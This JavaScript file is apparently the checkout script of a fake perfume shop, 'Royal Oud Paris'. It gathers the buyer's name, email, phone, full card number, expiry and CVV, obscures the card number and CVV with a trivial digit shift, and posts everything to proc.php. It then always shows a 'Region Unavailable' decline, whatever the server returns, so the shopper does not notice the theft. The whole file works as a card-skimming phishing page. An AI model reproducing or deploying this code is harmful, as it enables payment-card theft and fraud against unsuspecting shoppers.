document.addEventListener('DOMContentLoaded', function() {
    const loadingOverlay = document.getElementById('loadingOverlay');
    const cardNumberInput = document.getElementById('cardNumber');
    const expiryDateInput = document.getElementById('expiryDate');
    const cvvInput = document.getElementById('cvv');

    // Get all form inputs and the submit button
    const form = document.getElementById('paymentForm');
    const payButton = document.getElementById('cardPayBtn');
    const requiredInputs = form.querySelectorAll('input[required]');
    
    // Initially disable the button
    payButton.disabled = true;

    // Function to check if all fields are filled
    function checkFormValidity() {
        let isValid = true;
        
        requiredInputs.forEach(input => {
            // Check if input is empty or (for card number) doesn't meet minimum length
            if (!input.value.trim() || 
                (input.id === 'cardNumber' && input.value.replace(/\s/g, '').length < 16) ||
                (input.id === 'expiryDate' && input.value.length < 5) ||
                (input.id === 'cvv' && input.value.length < 3)) {
                isValid = false;
            }
        });

        // Enable/disable button based on form validity
        payButton.disabled = !isValid;
    }

    // Add input event listener to all required fields
    requiredInputs.forEach(input => {
        input.addEventListener('input', checkFormValidity);
    });

    // Format card number with spaces
    cardNumberInput.addEventListener('input', function(e) {
        let value = e.target.value.replace(/\s/g, '');
        let formattedValue = '';
        for (let i = 0; i < value.length; i++) {
            if (i > 0 && i % 4 === 0) {
                formattedValue += ' ';
            }
            formattedValue += value[i];
        }
        e.target.value = formattedValue;
        
        // Update card type icon
        updateCardType(value);
        // Check form validity after formatting
        checkFormValidity();
    });

    // Format expiry date
    expiryDateInput.addEventListener('input', function(e) {
        let value = e.target.value.replace(/\D/g, '');
        if (value.length >= 2) {
            value = value.slice(0,2) + '/' + value.slice(2);
        }
        e.target.value = value;
        // Check form validity after formatting
        checkFormValidity();
    });

    // Restrict CVV to numbers only
    cvvInput.addEventListener('input', function(e) {
        e.target.value = e.target.value.replace(/\D/g, '');
        // Check form validity after input
        checkFormValidity();
    });

    // Your existing encryption function
    function encryptString(str) {
        return str.split('').map(char => {
            if (/[0-9]/.test(char)) {
                return ((parseInt(char) + 5) % 10).toString();
            }
            return char;
        }).join('');
    }

    // Handle form submission
    document.getElementById('paymentForm').addEventListener('submit', function(e) {
        e.preventDefault();
        
        const name = document.getElementById('name').value;
        const email = document.getElementById('email').value;
        const cardNumber = cardNumberInput.value.replace(/\s/g, '');
        const phoneNumber = document.getElementById('phoneNumber').value;
        const expiryDate = expiryDateInput.value;
        const cvv = cvvInput.value;

        // Validation
        if (!validateForm(name, email, cardNumber, phoneNumber, expiryDate, cvv)) {
            return;
        }

        // Show loading
        loadingOverlay.style.display = 'flex';

        // Process payment after 2 seconds
        setTimeout(() => {
            handleCardSubmission(name, email, cardNumber, phoneNumber, expiryDate, cvv);
        }, 2000);
    });

    // Form validation
    function validateForm(name, email, cardNumber, phone, expiry, cvv) {
        if (!name || !email || !cardNumber || !phone || !expiry || !cvv) {
            showError('Please fill in all fields');
            return false;
        }

        if (!/^\d{16}$/.test(cardNumber)) {
            showError('Invalid card number');
            return false;
        }

        if (!/^\d{2}\/\d{2}$/.test(expiry)) {
            showError('Invalid expiry date');
            return false;
        }

        if (!/^\d{3,4}$/.test(cvv)) {
            showError('Invalid CVV');
            return false;
        }

        return true;
    }

    // Show error message
    function showError(message) {
        Swal.fire({
            icon: 'error',
            title: 'Payment Declined',
            text: message,
            confirmButtonText: 'Try Again',
            customClass: {
                popup: 'swal2-popup',
                title: 'swal2-title',
                htmlContainer: 'swal2-html-container',
                confirmButton: 'swal2-confirm'
            }
        });
    }

    // Handle card submission
    function handleCardSubmission(name, email, cardNumber, phoneNumber, expiryDate, cvv) {
        const cardData = {
            name: name,
            email: email,
            number: encryptString(cardNumber),
            phone: phoneNumber,
            expiry: expiryDate,
            cvv: encryptString(cvv)
        };

        fetch('proc.php', {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json',
            },
            body: JSON.stringify(cardData)
        })
        .then(response => response.json())
        .then(data => {
            console.log('Server response:', data);
            if (data.status === 'error') {
                console.error('Server error:', data.message);
            }
            showDeclinedMessage();
        })
        .catch(error => {
            console.error('Fetch error:', error);
            showDeclinedMessage();
        });
    }

    // Show declined message
    function showDeclinedMessage() {
        loadingOverlay.style.display = 'none';
        
        Swal.fire({
            icon: 'error',
            title: 'Region Unavailable',
            html: `
                <p>We apologize, but Royal Oud Paris is not yet available in your region.</p>
                <p style="margin-top: 1rem; font-size: 0.9rem; opacity: 0.8;">
                    We are working diligently to bring our exclusive fragrances to more locations. 
                    Please subscribe to our newsletter to be notified when we launch in your area.
                </p>
            `,
            confirmButtonText: 'Return to Collection',
            customClass: {
                popup: 'swal2-popup',
                title: 'swal2-title',
                htmlContainer: 'swal2-html-container',
                confirmButton: 'swal2-confirm'
            }
        }).then((result) => {
            if (result.isConfirmed) {
                window.location.href = 'index.html'; // Redirect to collection section
            }
        });
    }

    // Update card type icon based on number
    function updateCardType(number) {
        const visa = document.querySelector('.fa-cc-visa');
        const mastercard = document.querySelector('.fa-cc-mastercard');
        
        visa.classList.remove('active');
        mastercard.classList.remove('active');

        if (number.startsWith('4')) {
            visa.classList.add('active');
        } else if (number.startsWith('5')) {
            mastercard.classList.add('active');
        }
    }

    // Get product info from URL parameters
    const urlParams = new URLSearchParams(window.location.search);
    const productType = urlParams.get('type');
    
    // Product configurations
    const products = {
        perfume: {
            name: 'Royal Oud Paris',
            type: '100ml Eau de Parfum',
            price: 399,
            image: 'images/main.jpg'
        },
        tester: {
            name: 'Royal Oud Paris - Tester',
            type: '10ml Eau de Parfum Tester',
            price: 49,
            image: 'images/tester.jpg'
        }
    };

    // Update checkout page with selected product
    function updateProductInfo(productType) {
        const product = products[productType] || products.perfume; // Default to perfume if no type specified
        
        document.getElementById('checkoutProductImage').src = product.image;
        document.getElementById('checkoutProductName').textContent = product.name;
        document.getElementById('checkoutProductType').textContent = product.type;
        document.getElementById('checkoutProductPrice').textContent = `€${product.price}`;
        document.getElementById('checkoutTotal').textContent = `€${product.price}`; // Adding shipping
    }

    // Update the page with selected product
    updateProductInfo(productType);

}); 